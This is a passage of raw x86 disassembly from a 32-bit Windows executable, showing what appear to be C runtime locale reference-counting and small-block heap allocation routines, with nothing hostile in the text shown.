  424aaf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424ab3:	call   0x424b02
  424ab8:	mov    edi,DWORD PTR [ebp-0x20]
  424abb:	test   edi,edi
  424abd:	je     0x424ad1
  424abf:	push   DWORD PTR [ebp-0x1c]
  424ac2:	push   0x0
  424ac4:	push   edi
  424ac5:	call   0x426240
  424aca:	add    esp,0xc
  424acd:	test   edi,edi
  424acf:	jne    0x424b0b
  424ad1:	push   esi
  424ad2:	push   0x8
  424ad4:	push   DWORD PTR ds:0x460220
  424ada:	call   DWORD PTR ds:0x4280d8
  424ae0:	mov    edi,eax
  424ae2:	test   edi,edi
  424ae4:	jne    0x424b0b
  424ae6:	cmp    DWORD PTR ds:0x45fea8,edi
  424aec:	je     0x424b0b
  424aee:	push   esi
  424aef:	call   0x426222
  424af4:	pop    ecx
  424af5:	test   eax,eax
  424af7:	jne    0x424a73
  424afd:	jmp    0x424b0d
  424aff:	mov    esi,DWORD PTR [ebp+0xc]
  424b02:	push   0x4
  424b04:	call   0x423a6b
  424b09:	pop    ecx
  424b0a:	ret    
  424b0b:	mov    eax,edi
  424b0d:	call   0x42397b
  424b12:	ret    
  424b13:	push   esi
  424b14:	mov    esi,DWORD PTR [esp+0x8]
  424b18:	mov    eax,DWORD PTR [esi+0x3c]
  424b1b:	push   edi
  424b1c:	xor    edi,edi
  424b1e:	cmp    eax,DWORD PTR ds:0x45feb4
  424b24:	je     0x424b89
  424b26:	cmp    eax,edi
  424b28:	je     0x424b89
  424b2a:	mov    eax,DWORD PTR [esi+0x2c]
  424b2d:	cmp    DWORD PTR [eax],edi
  424b2f:	jne    0x424b89
  424b31:	mov    eax,DWORD PTR [esi+0x34]
  424b34:	cmp    eax,edi
  424b36:	je     0x424b54
  424b38:	cmp    DWORD PTR [eax],edi
  424b3a:	jne    0x424b54
  424b3c:	cmp    eax,DWORD PTR ds:0x45ffd0
  424b42:	je     0x424b54
  424b44:	push   eax
  424b45:	call   0x42454a
  424b4a:	push   DWORD PTR [esi+0x3c]
  424b4d:	call   0x42648f
  424b52:	pop    ecx
  424b53:	pop    ecx
  424b54:	mov    eax,DWORD PTR [esi+0x30]
  424b57:	cmp    eax,edi
  424b59:	je     0x424b77
  424b5b:	cmp    DWORD PTR [eax],edi
  424b5d:	jne    0x424b77
  424b5f:	cmp    eax,DWORD PTR ds:0x45ffd4
  424b65:	je     0x424b77
  424b67:	push   eax
  424b68:	call   0x42454a
  424b6d:	push   DWORD PTR [esi+0x3c]
  424b70:	call   0x426430
  424b75:	pop    ecx
  424b76:	pop    ecx
  424b77:	push   DWORD PTR [esi+0x2c]
  424b7a:	call   0x42454a
  424b7f:	push   DWORD PTR [esi+0x3c]
  424b82:	call   0x42454a
  424b87:	pop    ecx
  424b88:	pop    ecx
  424b89:	mov    eax,DWORD PTR [esi+0x40]
  424b8c:	cmp    eax,DWORD PTR ds:0x45ffcc
  424b92:	je     0x424bac
  424b94:	cmp    eax,edi
  424b96:	je     0x424bac
  424b98:	cmp    DWORD PTR [eax],edi
  424b9a:	jne    0x424bac
  424b9c:	push   eax
  424b9d:	call   0x42454a
  424ba2:	push   DWORD PTR [esi+0x44]
  424ba5:	call   0x42454a
  424baa:	pop    ecx
  424bab:	pop    ecx
  424bac:	mov    eax,DWORD PTR [esi+0x50]
  424baf:	cmp    eax,DWORD PTR ds:0x45feb0
  424bb5:	je     0x424bd3
  424bb7:	cmp    eax,edi
  424bb9:	je     0x424bd3
  424bbb:	cmp    DWORD PTR [eax+0xb4],edi
  424bc1:	jne    0x424bd3
  424bc3:	push   eax
  424bc4:	call   0x4262a0
  424bc9:	push   DWORD PTR [esi+0x50]
  424bcc:	call   0x42454a
  424bd1:	pop    ecx
  424bd2:	pop    ecx
  424bd3:	push   esi
  424bd4:	call   0x42454a
  424bd9:	pop    ecx
  424bda:	pop    edi
  424bdb:	pop    esi
  424bdc:	ret    
  424bdd:	push   esi
  424bde:	call   0x4237f3
  424be3:	mov    esi,eax
  424be5:	mov    eax,DWORD PTR [esi+0x64]
  424be8:	cmp    eax,DWORD PTR ds:0x45f66c
  424bee:	je     0x424c9a
  424bf4:	test   eax,eax
  424bf6:	je     0x424c27
  424bf8:	mov    ecx,DWORD PTR [eax+0x2c]
  424bfb:	dec    DWORD PTR [eax]
  424bfd:	test   ecx,ecx
  424bff:	je     0x424c03
  424c01:	dec    DWORD PTR [ecx]
  424c03:	mov    ecx,DWORD PTR [eax+0x34]
  424c06:	test   ecx,ecx
  424c08:	je     0x424c0c
  424c0a:	dec    DWORD PTR [ecx]
  424c0c:	mov    ecx,DWORD PTR [eax+0x30]
  424c0f:	test   ecx,ecx
  424c11:	je     0x424c15
  424c13:	dec    DWORD PTR [ecx]
  424c15:	mov    ecx,DWORD PTR [eax+0x40]
  424c18:	test   ecx,ecx
  424c1a:	je     0x424c1e
  424c1c:	dec    DWORD PTR [ecx]
  424c1e:	mov    ecx,DWORD PTR [eax+0x4c]
  424c21:	dec    DWORD PTR [ecx+0xb4]
  424c27:	mov    ecx,DWORD PTR ds:0x45f66c
  424c2d:	mov    DWORD PTR [esi+0x64],ecx
  424c30:	mov    ecx,DWORD PTR ds:0x45f66c
  424c36:	inc    DWORD PTR [ecx]
  424c38:	mov    ecx,DWORD PTR ds:0x45f66c
  424c3e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424c41:	test   ecx,ecx
  424c43:	je     0x424c47
  424c45:	inc    DWORD PTR [ecx]
  424c47:	mov    ecx,DWORD PTR ds:0x45f66c
  424c4d:	mov    ecx,DWORD PTR [ecx+0x34]
  424c50:	test   ecx,ecx
  424c52:	je     0x424c56
  424c54:	inc    DWORD PTR [ecx]
  424c56:	mov    ecx,DWORD PTR ds:0x45f66c
  424c5c:	mov    ecx,DWORD PTR [ecx+0x30]
  424c5f:	test   ecx,ecx
  424c61:	je     0x424c65
  424c63:	inc    DWORD PTR [ecx]
  424c65:	mov    ecx,DWORD PTR ds:0x45f66c
  424c6b:	mov    ecx,DWORD PTR [ecx+0x40]
  424c6e:	test   ecx,ecx
  424c70:	je     0x424c74
  424c72:	inc    DWORD PTR [ecx]
  424c74:	mov    ecx,DWORD PTR ds:0x45f66c
  424c7a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424c7d:	inc    DWORD PTR [ecx+0xb4]
  424c83:	test   eax,eax
  424c85:	je     0x424c9a
  424c87:	cmp    DWORD PTR [eax],0x0
  424c8a:	jne    0x424c9a
  424c8c:	cmp    eax,0x45f618
  424c91:	je     0x424c9a
  424c93:	push   eax
  424c94:	call   0x424b13
  424c99:	pop    ecx
  424c9a:	mov    eax,DWORD PTR [esi+0x64]
  424c9d:	pop    esi
  424c9e:	ret    
  424c9f:	push   0xc
  424ca1:	push   0x428798
  424ca6:	call   0x423940
  424cab:	push   0xc
  424cad:	call   0x423aff
  424cb2:	pop    ecx
  424cb3:	and    DWORD PTR [ebp-0x4],0x0
  424cb7:	call   0x424bdd
  424cbc:	mov    DWORD PTR [ebp-0x1c],eax
  424cbf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424cc3:	call   0x424cd1
  424cc8:	mov    eax,DWORD PTR [ebp-0x1c]
  424ccb:	call   0x42397b
  424cd0:	ret    
  424cd1:	push   0xc
  424cd3:	call   0x423a6b
  424cd8:	pop    ecx
  424cd9:	ret    
  424cda:	push   0x140
  424cdf:	push   0x0
  424ce1:	push   DWORD PTR ds:0x460220
  424ce7:	call   DWORD PTR ds:0x4280d8
  424ced:	test   eax,eax
  424cef:	mov    ds:0x45ffe0,eax
  424cf4:	jne    0x424cf7
  424cf6:	ret    
  424cf7:	mov    ecx,DWORD PTR [esp+0x4]
  424cfb:	and    DWORD PTR ds:0x45ffd8,0x0
  424d02:	and    DWORD PTR ds:0x45ffdc,0x0
  424d09:	mov    ds:0x45ffe8,eax
  424d0e:	xor    eax,eax
  424d10:	mov    DWORD PTR ds:0x45ffe4,ecx
  424d16:	mov    DWORD PTR ds:0x45ffec,0x10
  424d20:	inc    eax
  424d21:	ret    
  424d22:	mov    eax,ds:0x45ffdc
  424d27:	lea    ecx,[eax+eax*4]
  424d2a:	mov    eax,ds:0x45ffe0
  424d2f:	lea    ecx,[eax+ecx*4]
  424d32:	jmp    0x424d46
  424d34:	mov    edx,DWORD PTR [esp+0x4]
  424d38:	sub    edx,DWORD PTR [eax+0xc]
  424d3b:	cmp    edx,0x100000
  424d41:	jb     0x424d4c
  424d43:	add    eax,0x14
  424d46:	cmp    eax,ecx
  424d48:	jb     0x424d34
  424d4a:	xor    eax,eax
  424d4c:	ret    
  424d4d:	push   ebp
  424d4e:	mov    ebp,esp
  424d50:	sub    esp,0x10
  424d53:	mov    ecx,DWORD PTR [ebp+0x8]
  424d56:	mov    eax,DWORD PTR [ecx+0x10]
  424d59:	push   esi
  424d5a:	mov    esi,DWORD PTR [ebp+0xc]
  424d5d:	push   edi
  424d5e:	mov    edi,esi
  424d60:	sub    edi,DWORD PTR [ecx+0xc]
  424d63:	add    esi,0xfffffffc
  424d66:	shr    edi,0xf
  424d69:	mov    ecx,edi
  424d6b:	imul   ecx,ecx,0x204
  424d71:	lea    ecx,[ecx+eax*1+0x144]
  424d78:	mov    DWORD PTR [ebp-0x10],ecx
  424d7b:	mov    ecx,DWORD PTR [esi]
  424d7d:	dec    ecx
  424d7e:	test   cl,0x1
  424d81:	mov    DWORD PTR [ebp-0x4],ecx
  424d84:	jne    0x425061
  424d8a:	push   ebx
  424d8b:	lea    ebx,[ecx+esi*1]
  424d8e:	mov    edx,DWORD PTR [ebx]
  424d90:	mov    DWORD PTR [ebp-0xc],edx
  424d93:	mov    edx,DWORD PTR [esi-0x4]
  424d96:	mov    DWORD PTR [ebp-0x8],edx
  424d99:	mov    edx,DWORD PTR [ebp-0xc]
  424d9c:	test   dl,0x1
  424d9f:	mov    DWORD PTR [ebp+0xc],ebx
  424da2:	jne    0x424e18
  424da4:	sar    edx,0x4
  424da7:	dec    edx
  424da8:	cmp    edx,0x3f
  424dab:	jbe    0x424db0
  424dad:	push   0x3f
  424daf:	pop    edx
  424db0:	mov    ecx,DWORD PTR [ebx+0x4]
  424db3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424db6:	jne    0x424dfa
  424db8:	cmp    edx,0x20
  424dbb:	mov    ebx,0x80000000
  424dc0:	jae    0x424ddb
  424dc2:	mov    ecx,edx
  424dc4:	shr    ebx,cl
  424dc6:	lea    ecx,[edx+eax*1+0x4]
  424dca:	not    ebx
  424dcc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424dd0:	dec    BYTE PTR [ecx]
  424dd2:	jne    0x424df7
  424dd4:	mov    ecx,DWORD PTR [ebp+0x8]
  424dd7:	and    DWORD PTR [ecx],ebx
  424dd9:	jmp    0x424df7
  424ddb:	lea    ecx,[edx-0x20]
  424dde:	shr    ebx,cl
  424de0:	lea    ecx,[edx+eax*1+0x4]
  424de4:	not    ebx
  424de6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424ded:	dec    BYTE PTR [ecx]
  424def:	jne    0x424df7
  424df1:	mov    ecx,DWORD PTR [ebp+0x8]
  424df4:	and    DWORD PTR [ecx+0x4],ebx
  424df7:	mov    ebx,DWORD PTR [ebp+0xc]
  424dfa:	mov    edx,DWORD PTR [ebx+0x8]
  424dfd:	mov    ebx,DWORD PTR [ebx+0x4]
  424e00:	mov    ecx,DWORD PTR [ebp-0x4]
  424e03:	add    ecx,DWORD PTR [ebp-0xc]
  424e06:	mov    DWORD PTR [edx+0x4],ebx
  424e09:	mov    edx,DWORD PTR [ebp+0xc]
  424e0c:	mov    ebx,DWORD PTR [edx+0x4]
  424e0f:	mov    edx,DWORD PTR [edx+0x8]
  424e12:	mov    DWORD PTR [ebx+0x8],edx
  424e15:	mov    DWORD PTR [ebp-0x4],ecx
  424e18:	mov    edx,ecx
  424e1a:	sar    edx,0x4
  424e1d:	dec    edx
  424e1e:	cmp    edx,0x3f
  424e21:	jbe    0x424e26
  424e23:	push   0x3f
  424e25:	pop    edx
  424e26:	mov    ebx,DWORD PTR [ebp-0x8]
  424e29:	and    ebx,0x1
  424e2c:	mov    DWORD PTR [ebp-0xc],ebx
  424e2f:	jne    0x424ec4
  424e35:	sub    esi,DWORD PTR [ebp-0x8]
  424e38:	mov    ebx,DWORD PTR [ebp-0x8]
  424e3b:	sar    ebx,0x4
  424e3e:	push   0x3f
  424e40:	mov    DWORD PTR [ebp+0xc],esi
  424e43:	dec    ebx
  424e44:	pop    esi
  424e45:	cmp    ebx,esi
  424e47:	jbe    0x424e4b
  424e49:	mov    ebx,esi
  424e4b:	add    ecx,DWORD PTR [ebp-0x8]
  424e4e:	mov    edx,ecx
  424e50:	sar    edx,0x4
  424e53:	dec    edx
  424e54:	cmp    edx,esi
  424e56:	mov    DWORD PTR [ebp-0x4],ecx
  424e59:	jbe    0x424e5d
  424e5b:	mov    edx,esi
  424e5d:	cmp    ebx,edx
  424e5f:	je     0x424ebf
  424e61:	mov    ecx,DWORD PTR [ebp+0xc]
  424e64:	mov    esi,DWORD PTR [ecx+0x4]
  424e67:	cmp    esi,DWORD PTR [ecx+0x8]
  424e6a:	jne    0x424ea7
  424e6c:	cmp    ebx,0x20
  424e6f:	mov    esi,0x80000000
  424e74:	jae    0x424e8d
  424e76:	mov    ecx,ebx
  424e78:	shr    esi,cl
  424e7a:	not    esi
  424e7c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424e80:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e84:	jne    0x424ea7
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	and    DWORD PTR [ecx],esi
  424e8b:	jmp    0x424ea7
  424e8d:	lea    ecx,[ebx-0x20]
  424e90:	shr    esi,cl
  424e92:	not    esi
  424e94:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e9b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e9f:	jne    0x424ea7
  424ea1:	mov    ecx,DWORD PTR [ebp+0x8]
  424ea4:	and    DWORD PTR [ecx+0x4],esi
  424ea7:	mov    ecx,DWORD PTR [ebp+0xc]
  424eaa:	mov    esi,DWORD PTR [ecx+0x8]
  424ead:	mov    ecx,DWORD PTR [ecx+0x4]
  424eb0:	mov    DWORD PTR [esi+0x4],ecx
  424eb3:	mov    ecx,DWORD PTR [ebp+0xc]
  424eb6:	mov    esi,DWORD PTR [ecx+0x4]
  424eb9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ebc:	mov    DWORD PTR [esi+0x8],ecx
  424ebf:	mov    esi,DWORD PTR [ebp+0xc]
  424ec2:	jmp    0x424ec7
  424ec4:	mov    ebx,DWORD PTR [ebp+0x8]
  424ec7:	cmp    DWORD PTR [ebp-0xc],0x0
  424ecb:	jne    0x424ed5
  424ecd:	cmp    ebx,edx
  424ecf:	je     0x424f55
  424ed5:	mov    ecx,DWORD PTR [ebp-0x10]
  424ed8:	lea    ecx,[ecx+edx*8]
  424edb:	mov    ebx,DWORD PTR [ecx+0x4]
  424ede:	mov    DWORD PTR [esi+0x8],ecx
  424ee1:	mov    DWORD PTR [esi+0x4],ebx
  424ee4:	mov    DWORD PTR [ecx+0x4],esi
  424ee7:	mov    ecx,DWORD PTR [esi+0x4]
  424eea:	mov    DWORD PTR [ecx+0x8],esi
  424eed:	mov    ecx,DWORD PTR [esi+0x4]
  424ef0:	cmp    ecx,DWORD PTR [esi+0x8]
  424ef3:	jne    0x424f55
  424ef5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424ef9:	mov    BYTE PTR [ebp+0xf],cl
  424efc:	inc    cl
  424efe:	cmp    edx,0x20
  424f01:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424f05:	jae    0x424f2c
  424f07:	cmp    BYTE PTR [ebp+0xf],0x0
  424f0b:	jne    0x424f1b
  424f0d:	mov    ecx,edx
  424f0f:	mov    ebx,0x80000000
  424f14:	shr    ebx,cl
  424f16:	mov    ecx,DWORD PTR [ebp+0x8]
  424f19:	or     DWORD PTR [ecx],ebx
  424f1b:	mov    ebx,0x80000000
  424f20:	mov    ecx,edx
  424f22:	shr    ebx,cl
  424f24:	lea    eax,[eax+edi*4+0x44]
  424f28:	or     DWORD PTR [eax],ebx
  424f2a:	jmp    0x424f55
  424f2c:	cmp    BYTE PTR [ebp+0xf],0x0
  424f30:	jne    0x424f42
  424f32:	lea    ecx,[edx-0x20]
  424f35:	mov    ebx,0x80000000
  424f3a:	shr    ebx,cl
  424f3c:	mov    ecx,DWORD PTR [ebp+0x8]
  424f3f:	or     DWORD PTR [ecx+0x4],ebx
  424f42:	lea    ecx,[edx-0x20]
  424f45:	mov    edx,0x80000000
  424f4a:	shr    edx,cl
  424f4c:	lea    eax,[eax+edi*4+0xc4]
  424f53:	or     DWORD PTR [eax],edx
  424f55:	mov    eax,DWORD PTR [ebp-0x4]
  424f58:	mov    DWORD PTR [esi],eax
  424f5a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424f5e:	mov    eax,DWORD PTR [ebp-0x10]
  424f61:	dec    DWORD PTR [eax]
  424f63:	jne    0x425060
  424f69:	mov    eax,ds:0x45ffd8
  424f6e:	test   eax,eax
  424f70:	je     0x425052
  424f76:	mov    ecx,DWORD PTR ds:0x45fff0
  424f7c:	mov    esi,DWORD PTR ds:0x4280bc
  424f82:	push   0x4000
  424f87:	shl    ecx,0xf
  424f8a:	add    ecx,DWORD PTR [eax+0xc]
  424f8d:	mov    ebx,0x8000
  424f92:	push   ebx
  424f93:	push   ecx
  424f94:	call   esi
  424f96:	mov    ecx,DWORD PTR ds:0x45fff0
  424f9c:	mov    eax,ds:0x45ffd8
  424fa1:	mov    edx,0x80000000
  424fa6:	shr    edx,cl
  424fa8:	or     DWORD PTR [eax+0x8],edx
  424fab:	mov    eax,ds:0x45ffd8
  424fb0:	mov    eax,DWORD PTR [eax+0x10]
  424fb3:	mov    ecx,DWORD PTR ds:0x45fff0
  424fb9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424fc1:	mov    eax,ds:0x45ffd8
  424fc6:	mov    eax,DWORD PTR [eax+0x10]
  424fc9:	dec    BYTE PTR [eax+0x43]
  424fcc:	mov    eax,ds:0x45ffd8
  424fd1:	mov    ecx,DWORD PTR [eax+0x10]
  424fd4:	cmp    BYTE PTR [ecx+0x43],0x0
  424fd8:	jne    0x424fe3
  424fda:	and    DWORD PTR [eax+0x4],0xfffffffe
  424fde:	mov    eax,ds:0x45ffd8
  424fe3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424fe7:	jne    0x425052
  424fe9:	push   ebx
  424fea:	push   0x0
  424fec:	push   DWORD PTR [eax+0xc]
  424fef:	call   esi
  424ff1:	mov    eax,ds:0x45ffd8
  424ff6:	push   DWORD PTR [eax+0x10]
  424ff9:	push   0x0
  424ffb:	push   DWORD PTR ds:0x460220
  425001:	call   DWORD PTR ds:0x4280c0
  425007:	mov    eax,ds:0x45ffdc
  42500c:	mov    edx,DWORD PTR ds:0x45ffe0
  425012:	lea    eax,[eax+eax*4]
  425015:	shl    eax,0x2
  425018:	mov    ecx,eax
  42501a:	mov    eax,ds:0x45ffd8
  42501f:	sub    ecx,eax
  425021:	lea    ecx,[ecx+edx*1-0x14]
  425025:	push   ecx
  425026:	lea    ecx,[eax+0x14]
  425029:	push   ecx
  42502a:	push   eax
  42502b:	call   0x426880
  425030:	mov    eax,DWORD PTR [ebp+0x8]
  425033:	add    esp,0xc
  425036:	dec    DWORD PTR ds:0x45ffdc
  42503c:	cmp    eax,DWORD PTR ds:0x45ffd8
  425042:	jbe    0x425048
  425044:	sub    DWORD PTR [ebp+0x8],0x14
  425048:	mov    eax,ds:0x45ffe0
  42504d:	mov    ds:0x45ffe8,eax
  425052:	mov    eax,DWORD PTR [ebp+0x8]
  425055:	mov    ds:0x45ffd8,eax
  42505a:	mov    DWORD PTR ds:0x45fff0,edi
  425060:	pop    ebx
  425061:	pop    edi
  425062:	pop    esi
  425063:	leave  
  425064:	ret    
  425065:	mov    eax,ds:0x45ffdc
  42506a:	mov    ecx,DWORD PTR ds:0x45ffec
  425070:	push   edi
  425071:	xor    edi,edi
  425073:	cmp    eax,ecx
  425075:	jne    0x4250ab
  425077:	lea    eax,[ecx+ecx*4+0x50]
  42507b:	shl    eax,0x2
  42507e:	push   eax
  42507f:	push   DWORD PTR ds:0x45ffe0
  425085:	push   edi
  425086:	push   DWORD PTR ds:0x460220
  42508c:	call   DWORD PTR ds:0x4280e0
  425092:	cmp    eax,edi
  425094:	jne    0x42509a
  425096:	xor    eax,eax
  425098:	pop    edi
  425099:	ret    
  42509a:	add    DWORD PTR ds:0x45ffec,0x10
  4250a1:	mov    ds:0x45ffe0,eax
  4250a6:	mov    eax,ds:0x45ffdc
  4250ab:	mov    ecx,DWORD PTR ds:0x45ffe0
  4250b1:	push   esi
  4250b2:	push   0x41c4
  4250b7:	push   0x8
  4250b9:	push   DWORD PTR ds:0x460220
  4250bf:	lea    eax,[eax+eax*4]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	call   DWORD PTR ds:0x4280d8
  4250cb:	cmp    eax,edi
  4250cd:	mov    DWORD PTR [esi+0x10],eax
  4250d0:	jne    0x4250d6
  4250d2:	xor    eax,eax
  4250d4:	jmp    0x425119
  4250d6:	push   0x4
  4250d8:	push   0x2000
  4250dd:	push   0x100000
  4250e2:	push   edi
  4250e3:	call   DWORD PTR ds:0x42802c
  4250e9:	cmp    eax,edi
  4250eb:	mov    DWORD PTR [esi+0xc],eax
  4250ee:	jne    0x425102
  4250f0:	push   DWORD PTR [esi+0x10]
  4250f3:	push   edi
  4250f4:	push   DWORD PTR ds:0x460220
  4250fa:	call   DWORD PTR ds:0x4280c0
  425100:	jmp    0x4250d2
  425102:	or     DWORD PTR [esi+0x8],0xffffffff
  425106:	mov    DWORD PTR [esi],edi
  425108:	mov    DWORD PTR [esi+0x4],edi
  42510b:	inc    DWORD PTR ds:0x45ffdc
  425111:	mov    eax,DWORD PTR [esi+0x10]
  425114:	or     DWORD PTR [eax],0xffffffff
  425117:	mov    eax,esi
  425119:	pop    esi
  42511a:	pop    edi
  42511b:	ret    
  42511c:	push   ebp
  42511d:	mov    ebp,esp
  42511f:	push   ecx
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp+0x8]
  425124:	mov    eax,DWORD PTR [ecx+0x8]
  425127:	push   ebx
  425128:	push   esi
  425129:	mov    esi,DWORD PTR [ecx+0x10]
  42512c:	push   edi
  42512d:	xor    ebx,ebx
  42512f:	jmp    0x425134
  425131:	shl    eax,1
  425133:	inc    ebx
  425134:	test   eax,eax
  425136:	jge    0x425131
  425138:	mov    eax,ebx
  42513a:	imul   eax,eax,0x204
  425140:	lea    eax,[eax+esi*1+0x144]
  425147:	push   0x3f
  425149:	mov    DWORD PTR [ebp-0x8],eax
  42514c:	pop    edx
  42514d:	mov    DWORD PTR [eax+0x8],eax
  425150:	mov    DWORD PTR [eax+0x4],eax
  425153:	add    eax,0x8
  425156:	dec    edx
  425157:	jne    0x42514d
  425159:	push   0x4
  42515b:	mov    edi,ebx
  42515d:	push   0x1000
  425162:	shl    edi,0xf
  425165:	add    edi,DWORD PTR [ecx+0xc]
  425168:	push   0x8000
  42516d:	push   edi
  42516e:	call   DWORD PTR ds:0x42802c
  425174:	test   eax,eax
  425176:	jne    0x425180
  425178:	or     eax,0xffffffff
  42517b:	jmp    0x42521d
  425180:	lea    edx,[edi+0x7000]
  425186:	cmp    edi,edx
  425188:	mov    DWORD PTR [ebp-0x4],edx
  42518b:	ja     0x4251d0
  42518d:	mov    ecx,edx
  42518f:	sub    ecx,edi
  425191:	shr    ecx,0xc
  425194:	lea    eax,[edi+0x10]
  425197:	inc    ecx
  425198:	or     DWORD PTR [eax-0x8],0xffffffff
  42519c:	or     DWORD PTR [eax+0xfec],0xffffffff
  4251a3:	lea    edx,[eax+0xffc]
  4251a9:	mov    DWORD PTR [eax],edx
  4251ab:	lea    edx,[eax-0x1004]
  4251b1:	mov    DWORD PTR [eax-0x4],0xff0
  4251b8:	mov    DWORD PTR [eax+0x4],edx
  4251bb:	mov    DWORD PTR [eax+0xfe8],0xff0
  4251c5:	add    eax,0x1000
  4251ca:	dec    ecx
  4251cb:	jne    0x425198
  4251cd:	mov    edx,DWORD PTR [ebp-0x4]
  4251d0:	mov    eax,DWORD PTR [ebp-0x8]
  4251d3:	add    eax,0x1f8
  4251d8:	lea    ecx,[edi+0xc]
  4251db:	mov    DWORD PTR [eax+0x4],ecx
  4251de:	mov    DWORD PTR [ecx+0x8],eax
  4251e1:	lea    ecx,[edx+0xc]
  4251e4:	mov    DWORD PTR [eax+0x8],ecx
  4251e7:	mov    DWORD PTR [ecx+0x4],eax
  4251ea:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  4251ef:	xor    edi,edi
  4251f1:	inc    edi
  4251f2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  4251f9:	mov    al,BYTE PTR [esi+0x43]
  4251fc:	mov    cl,al
  4251fe:	inc    cl
  425200:	test   al,al
  425202:	mov    eax,DWORD PTR [ebp+0x8]
  425205:	mov    BYTE PTR [esi+0x43],cl
  425208:	jne    0x42520d
  42520a:	or     DWORD PTR [eax+0x4],edi
  42520d:	mov    edx,0x80000000
  425212:	mov    ecx,ebx
  425214:	shr    edx,cl
  425216:	not    edx
  425218:	and    DWORD PTR [eax+0x8],edx
  42521b:	mov    eax,ebx
  42521d:	pop    edi
  42521e:	pop    esi
  42521f:	pop    ebx
  425220:	leave  
  425221:	ret    
  425222:	push   ebp
  425223:	mov    ebp,esp
  425225:	sub    esp,0xc
  425228:	mov    ecx,DWORD PTR [ebp+0x8]
  42522b:	mov    eax,DWORD PTR [ecx+0x10]
  42522e:	push   ebx
  42522f:	push   esi
  425230:	mov    esi,DWORD PTR [ebp+0x10]
  425233:	push   edi
  425234:	mov    edi,DWORD PTR [ebp+0xc]
  425237:	mov    edx,edi
  425239:	sub    edx,DWORD PTR [ecx+0xc]
  42523c:	add    esi,0x17
  42523f:	shr    edx,0xf
  425242:	mov    ecx,edx
  425244:	imul   ecx,ecx,0x204
  42524a:	lea    ecx,[ecx+eax*1+0x144]
  425251:	mov    DWORD PTR [ebp-0xc],ecx
  425254:	mov    ecx,DWORD PTR [edi-0x4]
  425257:	and    esi,0xfffffff0
  42525a:	dec    ecx
  42525b:	cmp    esi,ecx
  42525d:	lea    edi,[ecx+edi*1-0x4]
  425261:	mov    ebx,DWORD PTR [edi]
  425263:	mov    DWORD PTR [ebp+0x10],ecx
  425266:	mov    DWORD PTR [ebp-0x4],ebx
  425269:	jle    0x4253c4
  42526f:	test   bl,0x1
  425272:	jne    0x4253bd
  425278:	add    ebx,ecx
  42527a:	cmp    esi,ebx
  42527c:	jg     0x4253bd
  425282:	mov    ecx,DWORD PTR [ebp-0x4]
  425285:	sar    ecx,0x4
  425288:	dec    ecx
  425289:	cmp    ecx,0x3f
  42528c:	mov    DWORD PTR [ebp-0x8],ecx
  42528f:	jbe    0x425297
  425291:	push   0x3f
  425293:	pop    ecx
  425294:	mov    DWORD PTR [ebp-0x8],ecx
  425297:	mov    ebx,DWORD PTR [edi+0x4]
  42529a:	cmp    ebx,DWORD PTR [edi+0x8]
  42529d:	jne    0x4252e2
  42529f:	cmp    ecx,0x20
  4252a2:	mov    ebx,0x80000000
  4252a7:	jae    0x4252c3
  4252a9:	shr    ebx,cl
  4252ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4252ae:	lea    ecx,[ecx+eax*1+0x4]
  4252b2:	not    ebx
  4252b4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4252b8:	dec    BYTE PTR [ecx]
  4252ba:	jne    0x4252e2
  4252bc:	mov    ecx,DWORD PTR [ebp+0x8]
  4252bf:	and    DWORD PTR [ecx],ebx
  4252c1:	jmp    0x4252e2
  4252c3:	add    ecx,0xffffffe0
  4252c6:	shr    ebx,cl
  4252c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4252cb:	lea    ecx,[ecx+eax*1+0x4]
  4252cf:	not    ebx
  4252d1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4252d8:	dec    BYTE PTR [ecx]
  4252da:	jne    0x4252e2
  4252dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4252df:	and    DWORD PTR [ecx+0x4],ebx
  4252e2:	mov    ecx,DWORD PTR [edi+0x8]
  4252e5:	mov    ebx,DWORD PTR [edi+0x4]
  4252e8:	mov    DWORD PTR [ecx+0x4],ebx
  4252eb:	mov    ecx,DWORD PTR [edi+0x4]
  4252ee:	mov    edi,DWORD PTR [edi+0x8]
  4252f1:	mov    DWORD PTR [ecx+0x8],edi
  4252f4:	mov    ecx,DWORD PTR [ebp+0x10]
  4252f7:	sub    ecx,esi
  4252f9:	add    DWORD PTR [ebp-0x4],ecx
  4252fc:	cmp    DWORD PTR [ebp-0x4],0x0
  425300:	jle    0x4253ab
  425306:	mov    edi,DWORD PTR [ebp-0x4]
  425309:	mov    ecx,DWORD PTR [ebp+0xc]
  42530c:	sar    edi,0x4
  42530f:	dec    edi
  425310:	cmp    edi,0x3f
  425313:	lea    ecx,[ecx+esi*1-0x4]
  425317:	jbe    0x42531c
  425319:	push   0x3f
  42531b:	pop    edi
  42531c:	mov    ebx,DWORD PTR [ebp-0xc]
  42531f:	lea    ebx,[ebx+edi*8]
  425322:	mov    DWORD PTR [ebp+0x10],ebx
  425325:	mov    ebx,DWORD PTR [ebx+0x4]
  425328:	mov    DWORD PTR [ecx+0x4],ebx
  42532b:	mov    ebx,DWORD PTR [ebp+0x10]
  42532e:	mov    DWORD PTR [ecx+0x8],ebx
  425331:	mov    DWORD PTR [ebx+0x4],ecx
